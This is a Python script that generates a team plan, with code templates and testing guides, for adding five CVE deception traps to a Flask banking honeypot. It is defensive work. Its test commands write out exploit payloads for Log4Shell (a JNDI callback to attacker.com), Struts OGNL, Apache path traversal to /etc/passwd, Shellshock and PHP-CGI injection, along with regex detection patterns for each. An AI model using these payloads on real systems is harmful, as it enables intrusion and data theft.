"""Generates the full CVE_Implementation_Plan folder structure."""
import os
from pathlib import Path

BASE = Path("CVE_Implementation_Plan")
BASE.mkdir(exist_ok=True)

CVES = {
    "CVE-2021-44228_Log4Shell": {
        "number": "CVE-2021-44228",
        "name": "Log4Shell",
        "tech": "Apache Log4j 2.x",
        "difficulty": "Advanced",
        "member": 1,
        "endpoint": "/api/v2/logs/ingest",
        "header": "X-Api-Version",
        "pattern": r"\$\{jndi:(ldap|rmi|dns|ldaps)://",
        "exploit_example": 'curl -H "X-Api-Version: ${jndi:ldap://attacker.com/a}" http://localhost:8001/api/v2/logs/ingest',
        "response": "HTTP 200 OK with fake Java log output",
        "real_world": "Affected millions of servers in Dec 2021. Used to attack Tesla, Amazon, Cloudflare.",
        "score": 10,
    },
    "CVE-2017-5638_Struts": {
        "number": "CVE-2017-5638",
        "name": "Apache Struts OGNL Injection",
        "tech": "Apache Struts 2",
        "difficulty": "Intermediate-Advanced",
        "member": 2,
        "endpoint": "/banking/transfer",
        "header": "Content-Type",
        "pattern": r"%\{|#\{|OGNL|\{[^}]*\.exec\(",
        "exploit_example": 'curl -H "Content-Type: %{(#_=\'multipart/form-data\').(@java.lang.Thread@currentThread()...}" http://localhost:8001/banking/transfer',
        "response": "HTTP 200 with Struts error page",
        "real_world": "Used in 2017 Equifax breach — 147 million records stolen.",
        "score": 9,
    },
    "CVE-2021-41773_Apache_PathTraversal": {
        "number": "CVE-2021-41773",
        "name": "Apache Path Traversal & RCE",
        "tech": "Apache HTTP Server 2.4.49",
        "difficulty": "Intermediate",
        "member": 3,
        "endpoint": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "header": "User-Agent",
        "pattern": r"(\.%2e|%2e\.|\.%252e|%252e\.){2,}",
        "exploit_example": 'curl "http://localhost:8001/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"',
        "response": "Fake /etc/passwd content",
        "real_world": "Exploited in the wild within 2 days of disclosure. Mass scanning observed.",
        "score": 8,
    },
    "CVE-2014-6271_Shellshock": {
        "number": "CVE-2014-6271",
        "name": "Shellshock Bash RCE",
        "tech": "GNU Bash via CGI",
        "difficulty": "Intermediate-Beginner",
        "member": 4,
        "endpoint": "/cgi-bin/status.sh",
        "header": "User-Agent",
        "pattern": r"\(\s*\)\s*\{[^}]*\};\s*",
        "exploit_example": "curl -H 'User-Agent: () { :; }; echo; /bin/bash -c \"id\"' http://localhost:8001/cgi-bin/status.sh",
        "response": "Fake bash output: uid=33(www-data)",
        "real_world": "Found in 2014. Affected web servers, routers, cameras. Still scanned for today.",
        "score": 7,
    },
    "CVE-2012-1823_PHP_CGI": {
        "number": "CVE-2012-1823",
        "name": "PHP-CGI Argument Injection",
        "tech": "PHP-CGI (PHP before 5.3.12 / 5.4.2)",
        "difficulty": "Beginner",
        "member": 5,
        "endpoint": "/index.php",
        "header": "Query String",
        "pattern": r"[?&]-[sd](?:&|$|%)",
        "exploit_example": "curl 'http://localhost:8001/index.php?-s' && curl 'http://localhost:8001/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'",
        "response": "Fake PHP source code highlight",
        "real_world": "Mass exploitation wave in 2012. Still attempted on unpatched PHP deployments.",
        "score": 6,
    },
}

README = """# CVE Implementation Plan — Maze Myth Honeypot

## Overview

This folder contains the complete implementation plan for adding **5 new CVE deception traps** to the Maze Myth honeypot.

## CVE Priority Table

| Priority | CVE | Name | Score | Member | Difficulty |
|----------|-----|------|-------|--------|------------|
| 1 | CVE-2021-44228 | Log4Shell | 10/10 | Member 1 | Advanced |
| 2 | CVE-2017-5638 | Struts OGNL | 9/10 | Member 2 | Intermediate-Advanced |
| 3 | CVE-2021-41773 | Apache Path Traversal | 8/10 | Member 3 | Intermediate |
| 4 | CVE-2014-6271 | Shellshock | 7/10 | Member 4 | Intermediate-Beginner |
| 5 | CVE-2012-1823 | PHP-CGI | 6/10 | Member 5 | Beginner |

## Folder Structure

```
CVE_Implementation_Plan/
├── README.md                           ← This file
├── CVE-2021-44228_Log4Shell/           ← Member 1 (Advanced)
├── CVE-2017-5638_Struts/               ← Member 2 (Intermediate-Advanced)
├── CVE-2021-41773_Apache_PathTraversal/← Member 3 (Intermediate)
├── CVE-2014-6271_Shellshock/           ← Member 4 (Intermediate-Beginner)
└── CVE-2012-1823_PHP_CGI/              ← Member 5 (Beginner)
```

Each CVE folder contains:
- `EXPLANATION.md` — What the CVE is, in plain English
- `IMPLEMENTATION_STEPS.md` — Exact step-by-step guide for the assigned member
- `CODE_TEMPLATE.py` — Starter code with TODO markers
- `TESTING_GUIDE.md` — Copy-paste curl commands to verify the trap works

## Timeline

| Week | Task |
|------|------|
| Week 1 | Implement traps (each member works independently) |
| Week 2 | Testing, code review, dashboard integration |

## How a CVE Trap Works

```
Attacker sends exploit payload
       │
       ▼
Flask route in honeypot.py detects pattern
       │
       ├─→ logger.critical() → log_files/api_audit.log + SQLite
       ├─→ attacker_intel.record_command() → per-IP behavioral profile
       └─→ Return realistic fake response (looks like real vulnerable server)
```

## Adding Your CVE to the Project

1. Open `honeypot.py`
2. Add your route **BEFORE** the `@app.route("/<path:full_path>")` catch-all (around line 1000)
3. Run `python honeypot.py` — no registration needed
4. Test with the commands in your `TESTING_GUIDE.md`
"""

def write(path, content):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    print(f"  Created: {path}")

write(BASE / "README.md", README)

for folder, d in CVES.items():
    cve_dir = BASE / folder

    # ── EXPLANATION.md ────────────────────────────────────────────────
    explanation = f"""# {d['number']}: {d['name']}

> **Assigned to:** Member {d['member']} | **Difficulty:** {d['difficulty']}

---

## 🎯 What Is This Vulnerability?

**{d['name']}** affects **{d['tech']}**.

"""
    if d['number'] == "CVE-2021-44228":
        explanation += """Apache Log4j is a Java logging library used in millions of applications.
When an attacker sends a specially crafted string like `${jndi:ldap://evil.com/a}` in ANY logged field
(headers, usernames, search queries), Log4j tries to contact that remote server and execute code from it.

Imagine your app writes "User searched for: [attacker's text]" to a log file.
If that text contains the magic `${jndi:...}` string, the server contacts the attacker's machine.
"""
    elif d['number'] == "CVE-2017-5638":
        explanation += """Apache Struts is a Java web framework used heavily in banking and enterprise software.
The Content-Type header is supposed to tell the server what format the request body is in.
But attackers discovered they could put OGNL (Object-Graph Navigation Language) expressions inside it,
and Struts would **execute those expressions** — allowing arbitrary code execution.

Think of it like: you send a letter saying "my name is: `${delete all files}`" and the server actually does it.
"""
    elif d['number'] == "CVE-2021-41773":
        explanation += """Apache HTTP Server 2.4.49 had a bug where URL-encoded `../` sequences like `.%2e/`
were not properly blocked by the path traversal protection.

This let attackers escape the web root directory by crafting a URL like:
`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`

Which Apache resolves to: `/etc/passwd` — reading sensitive system files.
Combined with CGI, this became Remote Code Execution.
"""
    elif d['number'] == "CVE-2014-6271":
        explanation += """GNU Bash allows you to define functions in environment variables.
The bug: Bash would also **execute any commands** that appeared after the function definition.

When a web server runs CGI scripts, HTTP headers become environment variables.
So an attacker could put `() { :; }; malicious_command` in the User-Agent header,
and the server would execute it every time a CGI script ran.
"""
    elif d['number'] == "CVE-2012-1823":
        explanation += """When PHP is configured as a CGI application, the query string of a URL
is passed as command-line arguments to the PHP interpreter.

Attackers discovered they could pass `-s` (show source), `-d` (set php.ini directive),
or other PHP flags directly via the URL query string.

Example: `http://victim.com/index.php?-s` → dumps the PHP source code of index.php.
"""

    explanation += f"""
## 🔍 Real-World Example

**{d['real_world']}**

Exploit HTTP request:
```bash
{d['exploit_example']}
```

## 🏦 Why This Matters for Our Banking Honeypot

Banks and financial systems run {d['tech']}.
Attackers specifically target these CVEs when they see banking-related endpoints.
Our honeypot looks like a real bank system, so this trap will attract genuine threat actors.

## 🎭 How We Simulate It

We **do NOT** run any vulnerable software. Instead:
1. We create a Flask route that looks like the vulnerable endpoint
2. We detect the malicious payload using regex patterns
3. We return a **realistic fake response** that makes the attacker think it worked
4. We log everything to our intelligence system

```
Attacker sends:  {d['exploit_example'][:70]}...
                          │
                          ▼
        Our Flask route detects the pattern
                          │
              ┌───────────┼───────────────┐
              ▼           ▼               ▼
          Log event   Record in      Return fake
          (CRITICAL)  attacker_intel  response
```

## 📊 What We Capture

- Attacker IP address and geolocation
- Full payload content (for pattern analysis)
- Timing of the attack
- Command extraction (if RCE attempt)
- Callback URLs (for Log4Shell JNDI URLs)

## 🏆 Utility Score: {d['score']}/10
"""

    write(cve_dir / "EXPLANATION.md", explanation)

    # ── IMPLEMENTATION_STEPS.md ───────────────────────────────────────
    steps = f"""# Implementation Steps: {d['name']}

> **Member {d['member']}** | Difficulty: **{d['difficulty']}** | CVE: **{d['number']}**

---

## 📁 Files You Will Edit

| File | What You'll Add |
|------|----------------|
| `honeypot.py` | The trap Flask route (MAIN TASK) |
| `ATTACK_GUIDE.md` | Testing curl commands |
| `dashboard/monitor.py` | Stats endpoint (optional) |

---

## 🛠️ Step-by-Step Guide

### Step 1: Open `honeypot.py`

Find this line (around line 1000):
```python
@app.route("/<path:full_path>", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
```
You will paste your code **ABOVE** this line.

---

### Step 2: Add the Trap Route

Copy the code from `CODE_TEMPLATE.py` and paste it above the catch-all route.

The route URL for this CVE is: `{d['endpoint']}`

**Why this URL?** Because real attackers scan for `{d['endpoint']}` — it's the known vulnerable path for {d['tech']}.

---

### Step 3: Add Pattern Detection

Inside your route function, detect the exploit pattern using:
```python
import re
PATTERN = re.compile(r'{d['pattern']}', re.IGNORECASE)
```

Check the `{d['header']}` for this pattern.

**Why this pattern?** This regex matches the specific signature of a {d['name']} exploit attempt.

---

### Step 4: Add Logging

When the pattern is detected:
```python
logger.critical(
    f"[{d['number']}] {d['name']} detected from {{client_ip}} | "
    f"Payload: {{payload[:200]}}"
)
```

This writes to BOTH `log_files/api_audit.log` AND `databases/honeypot.db` automatically.

---

### Step 5: Record in Attacker Intelligence

```python
from src.intel import attacker_intel as intel
intel.record_command(
    client_ip,
    f"{d['name']}: {{extracted_command}}",
    fake_output
)
```

This updates the per-IP behavioral profile visible in the dashboard.

---

### Step 6: Return a Realistic Response

{d['response']}

Add deceptive headers to make it look real:
```python
resp = make_response(fake_output)
resp.headers['Server'] = 'Apache/2.4.49'
resp.headers['X-Powered-By'] = '{d['tech']}'
return resp
```

---

### Step 7: Add Dashboard Endpoint

```python
@app.route("/api/dashboard/cve/{d['name'].lower().replace(' ', '-').replace('/', '-')}", methods=["GET"])
def dashboard_{d['number'].replace('-', '_').lower()}():
    events = state.get_logs(event="{d['number'].replace('-', '_')}", limit=100)
    return jsonify({{
        "cve": "{d['number']}",
        "name": "{d['name']}",
        "total_attempts": len(events),
        "unique_ips": len(set(e["client_ip"] for e in events if e["client_ip"])),
        "recent_events": events[:20]
    }})
```

---

### Step 8: Update `ATTACK_GUIDE.md`

Add a new section with the test commands from `TESTING_GUIDE.md`.

---

## ✅ Done When

- [ ] `python honeypot.py` starts with no errors
- [ ] `curl http://localhost:8001{d['endpoint']}` returns something (not 404)
- [ ] Running the exploit from TESTING_GUIDE.md shows CRITICAL in console
- [ ] `sqlite3 databases/honeypot.db "SELECT * FROM logs WHERE event LIKE '%{d['number'][:13].replace('-','_')}%' ORDER BY timestamp DESC LIMIT 3"` returns rows
"""
    write(cve_dir / "IMPLEMENTATION_STEPS.md", steps)

    # ── CODE_TEMPLATE.py ─────────────────────────────────────────────
    fn_name = d['number'].replace('-', '_').lower()
    dashboard_fn = f"dashboard_{fn_name}"
    fake_json = '{"status": "ok", "message": "Request processed"}'
    code = f'''"""
{d['number']} — {d['name']} Deception Trap
Assigned to: Member {d['member']} | Difficulty: {d['difficulty']}

Instructions:
  1. Read IMPLEMENTATION_STEPS.md first
  2. Fill in every TODO below
  3. Paste the two functions into honeypot.py (before the catch-all route)
  4. Run the tests in TESTING_GUIDE.md
"""

import re
from flask import request, jsonify, Response, make_response

# ── Detection pattern ─────────────────────────────────────────────────────────
# TODO 1: Verify this pattern matches exploit payloads (test at regex101.com)
_PATTERN_{fn_name.upper()} = re.compile(
    r\'{d['pattern']}\',
    re.IGNORECASE
)

# ── Fake response ─────────────────────────────────────────────────────────────
# TODO 2: Customize the fake output to look realistic for {d['tech']}
_FAKE_RESPONSE = \'{fake_json}\'


# =============================================================================
# PASTE THIS FUNCTION INTO honeypot.py  (BEFORE the /<path:full_path> route)
# =============================================================================
@app.route("{d['endpoint']}", methods=["GET", "POST", "OPTIONS"])
def trap_{fn_name}():
    """
    {d['number']}: {d['name']} Deception Trap

    Vulnerable technology: {d['tech']}
    Detection field:       {d['header']}
    """
    client_ip = request.remote_addr

    # TODO 3: Extract the field to check for the exploit pattern
    # For header-based CVEs:
    payload = request.headers.get("{d['header']}", "")
    # For query-string CVEs (e.g. CVE-2012-1823), use:
    # payload = request.query_string.decode("utf-8", errors="ignore")

    # Detect exploit attempt
    is_exploit = bool(_PATTERN_{fn_name.upper()}.search(payload))

    if is_exploit:
        # TODO 4: Extract the actual command or callback URL from the payload
        extracted = payload[:200]  # Replace with smarter extraction if needed

        # Log the attack (writes to log file + SQLite automatically)
        logger.critical(
            f"[{d['number']}] {d['name']} detected from {{client_ip}} | "
            f"Payload: {{extracted}}"
        )

        # TODO 5: Record in attacker intelligence
        try:
            from src.intel import attacker_intel as intel
            intel.record_command(
                client_ip,
                f"{d['name']}: {{extracted[:100]}}",
                _FAKE_RESPONSE
            )
        except Exception:
            pass

        # TODO 6: Return a realistic fake response
        resp = make_response(_FAKE_RESPONSE)
        resp.headers["Content-Type"]  = "application/json"
        resp.headers["Server"]        = "Apache/2.4.49"          # TODO: adjust for {d['tech']}
        resp.headers["X-Powered-By"]  = "{d['tech']}"
        return resp, 200

    # Normal (non-exploit) traffic — return a benign response
    return jsonify({{"status": "ok", "service": "BankCorp API"}}), 200


# =============================================================================
# PASTE THIS FUNCTION INTO honeypot.py ALSO (near other /api/dashboard routes)
# =============================================================================
@app.route("/api/dashboard/cve/{d['name'].lower().replace(' ', '-')}", methods=["GET"])
def {dashboard_fn}():
    """Dashboard stats endpoint for {d['number']}"""
    tag = "{d['number'].replace('-', '_')}"
    events = state.get_logs(event=tag, limit=200)
    return jsonify({{
        "cve":            "{d['number']}",
        "name":           "{d['name']}",
        "total_attempts": len(events),
        "unique_ips":     len(set(e["client_ip"] for e in events if e["client_ip"])),
        "recent_events":  events[:20],
    }})
'''
    write(cve_dir / "CODE_TEMPLATE.py", code)

    # ── TESTING_GUIDE.md ─────────────────────────────────────────────
    testing = f"""# Testing Guide: {d['name']}

> **CVE:** {d['number']} | **Member {d['member']}**

---

## Prerequisites

1. Honeypot is running: `python honeypot.py`
2. You can see console output
3. `curl` is installed

---

## Test 1: Normal Traffic (Should NOT trigger)

```bash
curl -s http://localhost:8001{d['endpoint']} | python -m json.tool
```

**Expected:** HTTP 200, normal JSON response, **no CRITICAL log**

---

## Test 2: Exploit Attempt (Should trigger)

```bash
{d['exploit_example']}
```

**Expected in console:**
```
[CRITICAL] [{d['number']}] {d['name']} detected from 127.0.0.1 | Payload: ...
```

---

## Test 3: Verify Log File

```bash
python -c "
import base64, pathlib
log = pathlib.Path('log_files/api_audit.log')
for line in log.read_text().splitlines()[-20:]:
    try:
        dec = base64.b64decode(line).decode()
        if '{d['number']}' in dec:
            print(dec)
    except: pass
"
```

---

## Test 4: Verify Database

```bash
sqlite3 databases/honeypot.db "SELECT timestamp, level, message FROM logs WHERE message LIKE '%{d['number']}%' ORDER BY timestamp DESC LIMIT 3;"
```

**Expected:** One or more rows showing your test attacks.

---

## Test 5: Dashboard Endpoint

```bash
curl -s http://localhost:8001/api/dashboard/cve/{d['name'].lower().replace(' ', '-')} | python -m json.tool
```

**Expected:**
```json
{{
  "cve": "{d['number']}",
  "name": "{d['name']}",
  "total_attempts": 1,
  "unique_ips": 1,
  "recent_events": [...]
}}
```

---

## ✅ Success Checklist

- [ ] Normal traffic → no false positive
- [ ] Exploit curl → CRITICAL appears in console
- [ ] Log file contains {d['number']} entry
- [ ] Database row created
- [ ] Dashboard API returns attempt count > 0
- [ ] Response headers show realistic server software
- [ ] Attacker profile updated (check `/api/dashboard/cve/file-upload/attacker/127.0.0.1`)

---

## 🐛 Troubleshooting

| Problem | Fix |
|---------|-----|
| 404 on your route | Route is after catch-all — move it higher in honeypot.py |
| Pattern not matching | Test regex at regex101.com with your exploit payload |
| No log entry | Ensure `logger.critical()` is inside the `if is_exploit:` block |
| DB not updating | Check `state.log_entry()` is called via SQLiteLogHandler |
| Import error | Use `from src.intel import attacker_intel as intel` |
"""
    write(cve_dir / "TESTING_GUIDE.md", testing)

print("\nAll files created successfully!")
print(f"Folder: {BASE.resolve()}")
